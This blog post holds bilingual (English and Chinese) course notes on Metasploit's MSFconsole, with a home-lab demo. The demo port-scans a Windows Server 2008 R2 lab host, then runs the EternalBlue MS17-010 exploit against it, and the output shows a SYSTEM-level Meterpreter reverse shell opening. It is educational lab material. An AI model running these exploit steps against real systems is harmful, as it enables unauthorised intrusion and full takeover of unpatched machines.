---
layout: post
title: "MSFconsole Fundamentals"
date: "2022-11-25"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# MSFconsole Fundamentals
## MSFconsole Fundamentals
Before we can start using the Metasploit Framework for penetration testing, we need to get an understanding of how to use MSFconsole.

The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all the functionality of the Metasploit Framework.

We will be utilizing MSFconsole as our primary MSF interface for the rest of the course.

# MSF 控制台基础知识
## MSF 控制台基础知识
在开始使用 Metasploit Framework 进行渗透测试之前，我们需要了解如何使用 MSFconsole。

Metasploit Framework Console (MSFconsole) 是一个易于使用的一体化界面，可让您访问 Metasploit Framework 的所有功能。

在本课程的其余部分，我们将使用 MSFconsole 作为主要的 MSF 界面。

## What You Need To Know
1. How to search for modules.
2. How to select modules.
3. How to configure module options & variables.
4. How to search for payloads.
5. Managing sessions.
6. Additional functionality.
7. Saving your configuration.

## 你需要知道什么
1. 如何搜索模块。
2. 如何选择模块。
3. 如何配置模块选项和变量。
4. 如何搜索有效负载。
5. 管理会话。
6. 附加功能。
7. 保存您的配置。

## MSF Module Variables
MSF modules will typically require information like the target & host IP address and port in order to initiate a remote exploit/connection.

These options can be configured through the use of MSF variables.

MSFconsole allows you to set both local variable values or global variable values.

|Variable|Purpose|
|---|---|
|LHOST|This variable is used to store the IP address of the attacker's system.|
|LPORT|This variable is used to store the port number on the attacker's system that will be used to receive a reverse connection.|
|RHOST|This variable is used to store the IP address of the target system/server.|
|RHOSTS|This variable is used to specify the IP addresses of multiple target systems or network ranges.|
|RPORT|This variable stores the port number that we are targeting on the target system.|


## MSF 模块变量
MSF 模块通常需要目标和主机 IP 地址和端口等信息才能启动远程利用/连接。

这些选项可以通过使用 MSF 变量进行配置。

MSFconsole 允许您设置局部变量值或全局变量值。

|变量|用途|
|---|---|
|LHOST|这个变量用来存放攻击者系统的IP地址。|
|LPORT|该变量用于存储攻击者系统上用于接收反向连接的端口号。|
|RHOST|该变量用于存储目标系统/服务器的 IP 地址。|
|RHOSTS|此变量用于指定多个目标系统或网络范围的 IP 地址。|
|RPORT|该变量存储我们在目标系统上定位的端口号。|

# Demo: MSFconsole Fundamentals（演示：MSFconsole 基础知识）
```
msf6 > help
msf6 > version 
msf6 > show all
msf6 > show exploits 
msf6 > show -h 
```

```
msf6 > search portscan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > shows options
msf6 auxiliary(scanner/portscan/tcp)> set RHOSTS 192.168.2.1
msf6 auxiliary(scanner/portscan/tcp)> set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp)> show options
msf6 auxiliary(scanner/portscan/tcp)> run 
msf6 auxiliary(scanner/portscan/tcp)> back 
```

```
msf6 > search -h
msf6 > search cve:2017 type:exploit platform:-windows # except Windows
msf6 > search cve:2017 type:exploit platform:windows
```

```
msf6 > search eternalblue
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.2.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
```

```
msf6 > sessions 
```

Banner grabbing.

```
msf6 > connect -h
msf6 > connect 192.168.2.1 80
```

# Home Lab
Target: Windows Server 2008 R2

```
192.168.248.133
```

```
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
```

```
msf6 > 帮助

核心命令
=============

    命令说明
    ------ ----------
    ？帮助菜单
    横幅显示一个很棒的 metasploit 横幅
    cd 改变当前工作目录
    颜色切换颜色
    connect 与主机通信
    debug 显示对调试有用的信息
    exit 退出控制台
    features 显示可以选择加入的尚未发布的功能列表
    get 获取上下文特定变量的值
    getg 获取全局变量的值
    grep Grep 另一个命令的输出
    帮助帮助菜单
    history 显示命令历史
    load 加载框架插件
    退出控制台
    repeat 重复命令列表
    route 通过会话路由流量
    save 保存活动数据存储
    sessions 转储会话列表并显示有关会话的信息
    set 将特定于上下文的变量设置为一个值
    setg 将全局变量设置为一个值
    sleep 在指定的秒数内不做任何事情
    spool 将控制台输出和屏幕写入文件
    threads 查看和操作后台线程
    提示 显示有用的生产力提示列表
    unload 卸载框架插件
    取消设置一个或多个特定于上下文的变量
    unsetg 取消设置一个或多个全局变量
    version 显示框架和控制台库的版本号


模块指令
===============

    命令说明
    ------ ----------
    advanced 显示一个或多个模块的高级选项
    back 从当前上下文中返回
    clearm 清除模块栈
    favorite 将模块添加到最喜欢的模块列表
    info 显示有关一个或多个模块的信息
    listm 列出模块栈
    loadpath 从路径中搜索和加载模块
    options 显示全局选项或一个或多个模块
    popm 从堆栈中弹出最新的模块并使其处于活动状态
    previous 将先前加载的模块设置为当前模块
    pushm 将活动模块或模块列表推送到模块堆栈
    reload_all 从所有定义的模块路径重新加载所有模块
    search 搜索模块名称和描述
    show 显示给定类型的模块，或所有模块
    使用按名称或搜索词/索引与模块交互

作业指令
============

    命令说明
    ------ ----------
    handler 启动一个负载处理程序作为作业
    jobs 显示和管理作业
    kill 杀死一份工作
    rename_job 重命名作业


资源脚本命令
========================

    命令说明
    ------ ----------
    makerc 将启动后输入的命令保存到文件中
    resource 运行存储在文件中的命令


数据库后端命令
=========================

    命令说明
    ------ ----------
    分析有关特定地址或地址范围的数据库信息
    db_connect 连接到现有的数据服务
    db_disconnect 断开与当前数据服务的连接
    db_export 导出包含数据库内容的文件
    db_import 导入扫描结果文件（文件类型将被自动检测）
    db_nmap 执行 nmap 并自动记录输出
    db_rebuild_cache 重建数据库存储的模块缓存（不推荐）
    db_remove 删除保存的数据服务条目
    db_save 将当前数据服务连接保存为默认连接以在启动时重新连接
    db_status 显示当前数据服务状态
    hosts 列出数据库中的所有主机
    loot 列出数据库中的所有战利品
    notes 列出数据库中的所有笔记
    services 列出数据库中的所有服务
    vulns 列出数据库中的所有漏洞
    工作空间 在数据库工作空间之间切换


凭据后端命令
============================

    命令说明
    ------ ----------
    creds 列出数据库中的所有凭据


开发人员命令
==================

    命令说明
    ------ ----------
    edit 使用首选编辑器编辑当前模块或文件
    irb 在当前上下文中打开交互式 Ruby shell
    log 显示 framework.log 如果可能分页到末尾
    pry 在当前模块或框架上打开 Pry 调试器
    reload_lib 从指定路径重新加载 Ruby 库文件
    时间 运行特定命令需要多长时间

控制台
==========

`msfconsole` 是 Metasploit Framework 的主要接口。这里有很多需要去的地方，请耐心等待并关注这个空间！

构建范围和列表
--------------------------

许多采用事物列表的命令和选项可以使用范围来避免必须手动列出每个所需的事物。所有范围都包括在内。

### ID 范围

采用 ID 列表的命令可以使用范围来提供帮助。各个 ID 必须用“,”（不允许有空格）分隔，范围可以用“-”或“..”表示。

### IP 范围

有几种方法可以指定可以混合在一起的 IP 地址范围。第一种方式是一个 IP 列表，仅由一个 ` `（ASCII 空格）分隔，带有一个可选的 `,`。下一种方式是 `BEGINNING_ADDRESS-END_ADDRESS` 形式的两个完整 IP 地址，例如 `127.0.1.44-127.0.2.33`。也可以使用 CIDR 规范，但是必须将整个地址提供给 Metasploit，例如“127.0.0.0/8”而不是“127/8”，这与 RFC 相反。
此外，网络掩码可以与域名结合使用以动态解析目标块。所有这些方法都适用于 IPv4 和 IPv6 地址。 IPv4 地址也可以用来自 [NMAP target
规范](https://nmap.org/book/man-target-specification.html)

### 例子

终止第一个会话：

    sessions -k 1

停止一些额外的运行作业：

    jobs -k 2-6,7,8,11..15

检查一组 IP 地址：

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

以一组 IPv6 主机为目标：

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

从解析的域名中定位一个块：

    set RHOSTS www.example.test/24
```

```
msf6 > version
Framework: 6.2.26-dev
Console  : 6.2.26-dev

```

```
msf6 > show all
msf6 > show exploits
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions

```

```
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

```

```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.248.133
RHOSTS => 192.168.248.133
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
PORTS => 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.248.133:      - 192.168.248.133:135 - TCP OPEN
[+] 192.168.248.133:      - 192.168.248.133:139 - TCP OPEN
[+] 192.168.248.133:      - 192.168.248.133:445 - TCP OPEN
[*] 192.168.248.133:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > back
```

```
msf6 > search -h
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

```
msf6 > 搜索-h
用法：搜索 [<选项>] [<关键字>:<值>]

在值前加上“-”将排除任何匹配结果。
如果未提供选项或关键字，则显示缓存的结果。


选项：

    -h, --help 帮助横幅
    -I, --ignore 如果唯一的匹配项与搜索同名则忽略该命令
    -o, --output <filename> 将输出以 csv 格式发送到文件
    -r, --sort-descending <column> 将搜索结果的顺序反转为降序
    -S, --filter <filter> 用于过滤搜索结果的正则表达式模式
    -s, --sort-ascending <column> 按指定列升序排列搜索结果
    -u, --use 如果只有一个结果则使用模块

关键词：
  aka ：具有匹配的 AKA（也称为）名称的模块
  author ：作者编写的模块
  arch ：影响此架构的模块
  bid ：具有匹配 Bugtraq ID 的模块
  cve ：具有匹配 CVE ID 的模块
  edb ：具有匹配的 Exploit-DB ID 的模块
  check ：支持“check”方法的模块
  date ：具有匹配披露日期的模块
  description ：具有匹配描述的模块
  fullname ：具有匹配全名的模块
  mod_time ：具有匹配修改日期的模块
  name ：具有匹配描述性名称的模块
  path ：具有匹配路径的模块
  platform : 影响这个平台的模块
  port : 具有匹配端口的模块
  rank ：具有匹配等级的模块（可以是描述性的（例如：'good'）或带有比较运算符的数字（例如：'gte400'））
  ref ：具有匹配 ref 的模块
  reference ：具有匹配参考的模块
  target ：影响此目标的模块
  type ：特定类型的模块（exploit、payload、auxiliary、encoder、evasion、post 或 nop）

支持的搜索列：
  rank ：按可利用性排名对模块进行排序
  date ：按公开日期对模块进行排序。 disclosure_date 的别名
  disclosure_date ：按公开日期对模块进行排序
  name ：按名称对模块进行排序
  type ：按类型对模块进行排序
  check ：根据模块是否具有检查方法对模块进行排序
例子:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

```
msf6 > search cve:2017 type:exploit platform:windows
```

```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.248.133
RHOSTS => 192.168.248.133
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.248.148:4444 
[*] 192.168.248.133:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.248.133:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)
[*] 192.168.248.133:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.248.133:445 - The target is vulnerable.
[*] 192.168.248.133:445 - Connecting to target for exploitation.
[+] 192.168.248.133:445 - Connection established for exploitation.
[+] 192.168.248.133:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.248.133:445 - CORE raw buffer dump (36 bytes)
[*] 192.168.248.133:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.248.133:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.248.133:445 - 0x00000020  37 36 30 30                                      7600            
[+] 192.168.248.133:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.248.133:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.248.133:445 - Sending all but last fragment of exploit packet
[*] 192.168.248.133:445 - Starting non-paged pool grooming
[+] 192.168.248.133:445 - Sending SMBv2 buffers
[+] 192.168.248.133:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.248.133:445 - Sending final SMBv2 buffers.
[*] 192.168.248.133:445 - Sending last fragment of exploit packet!
[*] 192.168.248.133:445 - Receiving response from exploit packet
[+] 192.168.248.133:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.248.133:445 - Sending egg to corrupted connection.
[*] 192.168.248.133:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.248.133
[+] 192.168.248.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.248.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.248.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (192.168.248.148:4444 -> 192.168.248.133:49175) at 2022-11-25 21:00:27 -0500

meterpreter > sysinfo
Computer        : WIN-4QCPUB6FIVL
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-4QCPUB6FIVL  192.168.248.148:4444 -> 192.168.248.133:49175 (192.168.248.133)
```

```
msf6 > connect -h
Usage: connect [options] <host> <port>

Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.

OPTIONS:

    -c, --comm <comm>               Specify which Comm to use.
    -C, --crlf                      Try to use CRLF for EOL sequence.
    -h, --help                      Help banner.
    -i, --send-contents <file>      Send the contents of a file.
    -p, --proxies <proxies>         List of proxies to use.
    -P, --source-port <port>        Specify source port.
    -S, --source-address <address>  Specify source address.
    -s, --ssl                       Connect with SSL.
    -u, --udp                       Switch to a UDP socket.
    -w, --timeout <seconds>         Specify connect timeout.
    -z, --try-connection            Just try to connect, then return.
```

```
msf6 > 连接-h
用法：连接 [选项] <主机> <端口>

与主机通信，类似于通过 netcat 进行交互，利用任何已配置的会话旋转。

选项：

     -c, --comm <comm> 指定要使用的 Comm。
     -C, --crlf 尝试将 CRLF 用于 EOL 序列。
     -h, --help 帮助横幅。
     -i, --send-contents <file> 发送文件的内容。
     -p, --proxies <proxies> 要使用的代理列表。
     -P, --source-port <端口> 指定源端口。
     -S, --source-address <address> 指定源地址。
     -s, --ssl 使用 SSL 连接。
     -u, --udp 切换到 UDP 套接字。
     -w, --timeout <seconds> 指定连接超时。
     -z, --try-connection 尝试连接，然后返回。
```

```
msf6 > connect 192.168.248.133 445
[*] Connected to 192.168.248.133:445 (via: 192.168.248.148:37095)
```




